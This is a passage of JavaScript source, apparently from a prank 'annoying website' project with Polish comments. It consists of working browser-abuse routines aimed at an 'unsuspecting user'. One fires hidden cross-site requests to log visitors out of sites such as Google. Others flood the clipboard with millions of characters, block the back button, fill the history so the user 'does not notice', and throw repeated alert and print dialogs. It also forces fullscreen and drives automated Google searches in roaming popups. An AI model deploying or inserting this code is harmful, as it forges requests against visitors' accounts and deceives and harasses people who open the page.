    if (!window.opener.closed) window.opener.onCloseWindow(window)
  })
}

/**
 * Handle a child window closing.
 */
function onCloseWindow (win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}

/**
 * Show the unsuspecting user a friendly hello message with a cat.
 */
function showHelloMessage () {
  const template = document.querySelector('template')
  const clone = document.importNode(template.content, true)
  document.body.appendChild(clone)
}

/**
 * Remove the hello message.
 */
function removeHelloMessage () {
  const helloMessage = document.querySelector('.hello-message')
  helloMessage.remove()
}

/**
 * Change the theme color of the browser in a loop.
 */
function rainbowThemeColor () {
  function zeroFill (width, number, pad = '0') {
    width -= number.toString().length
    if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
    return number + ''
  }

  const meta = document.querySelector('meta.theme-color')
  setInterval(() => {
    meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
  }, 50)
}
function repeatStringNumTimes(string, times) {
  var repeatedString = "";
  while (times > 0) {
    repeatedString += string;
    times--;
  }
  return repeatedString;
}
/**
 * Kopiuje ~4 miliony znaków do schowka  - added by @9fm
 */

function copySpamToClipboard () {
  clipboardCopy(veryLongString)
}

/**
 * Copy given text, `text`, onto the user's clipboard.
 * Requires user-initiated event.
 */
function clipboardCopy (text) {
  // A <span> contains the text to copy
  const span = document.createElement('span')
  span.textContent = text
  span.style.whiteSpace = 'pre' // Preserve consecutive spaces and newlines

  // An <iframe> isolates the <span> from the page's styles
  const iframe = document.createElement('iframe')
  iframe.sandbox = 'allow-same-origin'
  document.body.appendChild(iframe)

  let win = iframe.contentWindow
  win.document.body.appendChild(span)

  let selection = win.getSelection()

  // Firefox fails to get a selection from <iframe> window, so fallback
  if (!selection) {
    win = window
    selection = win.getSelection()
    document.body.appendChild(span)
  }

  const range = win.document.createRange()
  selection.removeAllRanges()
  range.selectNode(span)
  selection.addRange(range)

  let success = false
  try {
    success = win.document.execCommand('copy')
  } catch (err) {
    console.log(err)
  }

  selection.removeAllRanges()
  span.remove()
  iframe.remove()

  return success
}

/**
 * Show a modal dialog at a regular interval. Modals capture focus from other OS apps and browser tabs.
 * Except in Chrome 64+, where modals can only capture focus from other OS apps,
 * but not from other tabs.
 */
function startAlertInterval () {
  setInterval(() => {
    if (Math.random() < 0.5) {
      showAlert()
    } else {
      window.print()
    }
  }, 30000)
}

/**
 * Show an alert with 1000's of lines of cat ASCII art.
 */
function showAlert () {
  const randomArt = getRandomArrayEntry(ART)
  const longAlertText = Array(200).join(randomArt)
  window.alert(longAlertText)
}

/**
 * Fullscreen the browser window
 */
function requestFullscreen () {
  const requestFullscreen = Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen

  requestFullscreen.call(document.body)
}

/**
 * Log the user out of top sites they're logged into, including Google.com.
 * Inspired by https://superlogout.com
 */
function superLogout () {
  function cleanup (el, delayCleanup) {
    if (delayCleanup) {
      delayCleanup = false
      return
    }
    el.parentNode.removeChild(el)
  }

  function get (url) {
    const img = document.createElement('img')
    img.onload = () => cleanup(img)
    img.onerror = () => cleanup(img)
    img.style = HIDDEN_STYLE
    document.body.appendChild(img)
    img.src = url
  }

  function post (url, params) {
    const iframe = document.createElement('iframe')
    iframe.style = HIDDEN_STYLE
    iframe.name = 'iframe' + numSuperLogoutIframes
    document.body.appendChild(iframe)

    numSuperLogoutIframes += 1

    const form = document.createElement('form')
    form.style = HIDDEN_STYLE

    let numLoads = 0
    iframe.onload = iframe.onerror = () => {
      if (numLoads >= 1) cleanup(iframe)
      numLoads += 1
    }
    form.action = url
    form.method = 'POST'
    form.target = iframe.name

    for (const param in params) {
      if (Object.prototype.hasOwnProperty.call(params, param)) {
        const input = document.createElement('input')
        input.type = 'hidden'
        input.name = param
        input.value = params[param]
        form.appendChild(input)
      }
    }

    document.body.appendChild(form)
    form.submit()
  }
  for (const name in LOGOUT_SITES) {
    const method = LOGOUT_SITES[name][0]
    const url = LOGOUT_SITES[name][1]
    const params = LOGOUT_SITES[name][2] || {}

    if (method === 'GET') {
      get(url)
    } else {
      post(url, params)
    }

    const div = document.createElement('div')
    div.innerText = `Wylogowywanie się z ${name}...`

    const logoutMessages = document.querySelector('.logout-messages')
    logoutMessages.appendChild(div)
  }
}

/**
 * Disable the back button. If the user goes back, send them one page forward ;-)
 */
function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

/**
 * Fill the history with extra entries for this site, to make it harder to find
 * the previous site in the back button's dropdown menu.
 */
function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  // Set location back to the initial location, so user does not notice
  window.history.pushState({}, '', window.location.pathname)
}

/**
 * Get random x, y coordinates for a new window on the screen. Takes into account
 * screen size, window size, and leaves a safe margin on all sides.
 */
function getRandomCoords () {
  const x = MARGIN +
    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = MARGIN +
    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
  return { x, y }
}

/**
 * Get a random element from a given array, `arr`.
 */
function getRandomArrayEntry (arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

/** 
 * Automates a series of Google searches in a browser window, moving the window randomly between searches. - Added by @MARECKIyt
 */
function setupSearchWindow (win) {
  if (!win) return
  win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[0])
  let searchIndex = 1
  const interval = setInterval(() => {
    if (searchIndex >= SEARCHES.length) {
      clearInterval(interval)
      win.window.location = window.location.pathname
      return
    }

    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }

    win.window.location = window.location.pathname
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      win.moveTo(x, y)
      win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
      searchIndex += 1
    }, 500)
  }, 2500)
}
